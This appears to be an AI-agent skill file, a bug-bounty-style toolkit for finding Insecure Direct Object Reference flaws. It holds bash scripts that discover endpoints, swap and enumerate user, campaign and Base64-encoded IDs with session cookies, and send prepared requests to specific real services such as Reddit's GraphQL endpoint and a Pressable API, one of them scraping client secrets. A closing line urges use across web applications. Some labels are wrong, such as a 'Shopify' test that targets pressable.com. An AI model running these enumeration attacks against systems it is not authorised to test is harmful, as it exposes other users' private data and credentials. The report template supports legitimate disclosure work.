---
description: Find ENUMERABLE vulnerabilities in web applications. Use when testing for ENUMERABLE issues.
---

# ENUMERABLE Vulnerability Testing Toolkit

Test for Insecure Direct Object Reference (IDOR) vulnerabilities by enumerating IDs, parameters, and endpoints to access unauthorized resources.

## High-Value Patterns from Real Reports

### Common Vulnerable Parameters
- `id`, `user_id`, `subscription_id`, `label_ids`, `photo_ids`
- `media_code`, `board_id`, `campaign_id`, `message_id`
- `application[id]`, `responder_user_id`, `data-id`
- `attachment_ids`, `external_status_check_id`, `issue_ids`
- `subredditName`, `steamid`, `res_id`

### Vulnerable Endpoint Patterns
- `/api/v*/users/{id}/`, `/users/{id}/`
- `/{username}/{project}/boards/{id}.json`
- `/groups/{id}/`, `/campaigns/{id}/`
- `/admin/applications`, `/php/client_manage_handler`
- `/graphql` (with operation IDs)
- `*.ashx`, `*.aspx` endpoints
- `/remote.php/dav/calendars/{userId}`

### ID Types to Enumerate
- Sequential integers: `12345, 12346, 12347`
- Base64 encoded GIDs: `Z2lkOi8vaGFja2Vyb25lL0NhbXBhaWduLzI0NA==`
- UUIDs: `4e8da4a36b-ad0d-407a`
- Steam IDs: 17-digit numbers
- Mixed formats: `file:116`, `gid://gitlab/Epic/244`

## Testing Methodology

### Phase 1: Discovery
```bash
#!/bin/bash
# Discover potential IDOR endpoints
target_domain="$1"

echo "=== IDOR Endpoint Discovery ==="
# Find endpoints with ID parameters
curl -s "https://$target_domain" | grep -oP '/(api/v\d+/|admin/|php/)[^"]*\{[^}]*id[^}]*\}' | sort -u

# Check for common IDOR patterns
endpoints=(
    "/api/v1/users/"
    "/api/v2/users/"  
    "/admin/users/"
    "/users/"
    "/campaigns/"
    "/boards/"
    "/groups/"
    "/messages/"
    "/applications/"
)

for endpoint in "${endpoints[@]}"; do
    response=$(curl -s -o /dev/null -w "%{http_code}" "https://$target_domain$endpoint")
    if [[ $response != "404" ]]; then
        echo "Found potential endpoint: $endpoint (HTTP $response)"
    fi
done
```

### Phase 2: Parameter Identification
```bash
#!/bin/bash
# Identify vulnerable parameters in requests
function test_parameter_idor() {
    local url="$1"
    local param="$2" 
    local original_id="$3"
    local test_id="$4"
    local method="${5:-GET}"
    
    echo "Testing $param IDOR: $url"
    
    if [[ $method == "GET" ]]; then
        # Test GET parameter
        original=$(curl -s -b cookies.txt "$url?$param=$original_id")
        test=$(curl -s -b cookies.txt "$url?$param=$test_id")
    else
        # Test POST/PUT parameter
        original=$(curl -s -b cookies.txt -X $method -H "Content-Type: application/json" \
            -d "{\"$param\":\"$original_id\"}" "$url")
        test=$(curl -s -b cookies.txt -X $method -H "Content-Type: application/json" \
            -d "{\"$param\":\"$test_id\"}" "$url")
    fi
    
    # Check if responses differ (potential IDOR)
    if [[ "$original" != "$test" ]] && [[ ${#test} -gt 100 ]]; then
        echo "POTENTIAL IDOR FOUND: $param parameter"
        echo "Response length difference: ${#original} vs ${#test}"
        return 0
    fi
    return 1
}
```

### Phase 3: ID Enumeration
```bash
#!/bin/bash
# Enumerate IDs systematically
function enumerate_ids() {
    local base_url="$1"
    local start_id="${2:-1}"
    local end_id="${3:-100}"
    
    echo "=== ID Enumeration: $base_url ==="
    
    for id in $(seq $start_id $end_id); do
        response=$(curl -s -b cookies.txt -w "%{http_code}:%{size_download}" "$base_url/$id")
        http_code=$(echo "$response" | tail -n1 | cut -d: -f1)
        size=$(echo "$response" | tail -n1 | cut -d: -f2)
        
        case $http_code in
            200) echo "ID $id: SUCCESS (${size} bytes)" ;;
            403) echo "ID $id: FORBIDDEN (may exist)" ;;
            401) echo "ID $id: UNAUTHORIZED (may exist)" ;;
        esac
    done
}

# Test Base64 encoded IDs
function test_base64_ids() {
    local base_url="$1"
    
    echo "=== Testing Base64 GIDs ==="
    for id in {240..250}; do
        encoded=$(echo -n "gid://hackerone/Campaign/$id" | base64)
        response=$(curl -s -b cookies.txt "$base_url" -d "{\"campaign_id\":\"$encoded\"}" \
            -H "Content-Type: application/json" -w "%{http_code}")
        http_code=$(echo "$response" | tail -c 4)
        
        if [[ $http_code == "200" ]]; then
            echo "Found valid Base64 ID: $encoded (Campaign/$id)"
        fi
    done
}
```

### Phase 4: Specific Attack Vectors

#### GitLab Board Label IDOR
```bash
function test_gitlab_labels() {
    local target="$1"
    local board_id="$2"
    
    # Test label_ids IDOR
    curl -X PUT "https://$target/boards/$board_id.json" \
        -H "Content-Type: application/json" \
        -b cookies.txt \
        -d '{
            "board": {
                "id": '$board_id',
                "label_ids": [12345, 12346, 12347]
            }
        }' -v
}
```

#### Reddit Mod Logs IDOR  
```bash
function test_reddit_modlogs() {
    local subreddit="$1"
    
    curl -X POST "https://gql.reddit.com/" \
        -H "Authorization: Bearer $REDDIT_TOKEN" \
        -H "Content-Type: application/json" \
        -d '{
            "id": "6243efcbc61d",
            "variables": {"subredditName": "'$subreddit'"}
        }' | jq -r '.data'
}
```

#### Shopify Application IDOR
```bash
function test_shopify_apps() {
    local app_id="$1"
    
    # Test API application takeover
    curl -X POST "https://my.pressable.com/api/applications" \
        -b cookies.txt \
        -d "application%5Bid%5D=$app_id&authenticity_token=$csrf_token" | \
        grep -o 'Client ID\|Client Secret'
}
```

## Severity Rating Table

| Impact | Severity | Example |
|--------|----------|---------|
| Account takeover, critical data access | **Critical** | Email change IDOR, API credentials leak |
| Private data disclosure, unauthorized actions | **High** | Private messages, payment details, file deletion |
| Limited data exposure | **Medium** | User profiles, basic info disclosure |
| Minimal information leakage | **Low** | Public data enumeration, non-sensitive IDs |

## False Positives to Ignore

- **Public data enumeration** - If data is meant to be public
- **Rate limiting responses** - Different responses due to throttling
- **Cache variations** - Minor response differences from caching
- **Expected access controls** - 403/401 responses working correctly
- **Non-sensitive incremental IDs** - Like public post IDs, comment counts

## Testing Script Template

```bash
#!/bin/bash
# IDOR Testing Script
TARGET="$1"
COOKIES_FILE="cookies.txt"

# Login first to get authenticated session
echo "Logging in to get session..."
curl -c "$COOKIES_FILE" -d "username=testuser&password=testpass" \
    "https://$TARGET/login"

# Test common IDOR endpoints
declare -A endpoints=(
    ["/api/v1/users/"]="id"
    ["/campaigns/"]="campaign_id" 
    ["/boards/"]="board_id"
    ["/messages/"]="message_id"
)

for endpoint in "${!endpoints[@]}"; do
    param="${endpoints[$endpoint]}"
    echo "Testing $endpoint with parameter $param"
    
    # Test sequential IDs
    enumerate_ids "https://$TARGET$endpoint" 1 50
    
    # Test parameter manipulation
    test_parameter_idor "https://$TARGET$endpoint" "$param" "1" "999"
done

# Cleanup
rm -f "$COOKIES_FILE"
```

## Finding Report Template

```
## IDOR Vulnerability Report

**Summary:** Insecure Direct Object Reference in [ENDPOINT] allows unauthorized access to [RESOURCE TYPE]

**Vulnerable Endpoint:** `[METHOD] [URL]`
**Vulnerable Parameter:** `[PARAMETER_NAME]`

**Steps to Reproduce:**
1. Authenticate as low-privilege user
2. Capture request to [ENDPOINT]
3. Modify [PARAMETER] from [ORIGINAL_VALUE] to [TEST_VALUE]  
4. Observe unauthorized access to victim's [RESOURCE]

**Proof of Concept:**
```
[HTTP REQUEST]
```

**Impact:** 
- [X] Unauthorized data access
- [X] Privilege escalation  
- [X] Account takeover potential
- [X] [OTHER IMPACTS]

**Affected IDs tested:** [ID_RANGE] 
**Response size difference:** [ORIGINAL] vs [TEST] bytes

**Recommendation:** Implement proper authorization checks to verify user ownership of requested resources before processing requests.
```

Save this toolkit and use `curl`, `grep`, `jq`, and bash loops to systematically test for IDOR vulnerabilities across web applications.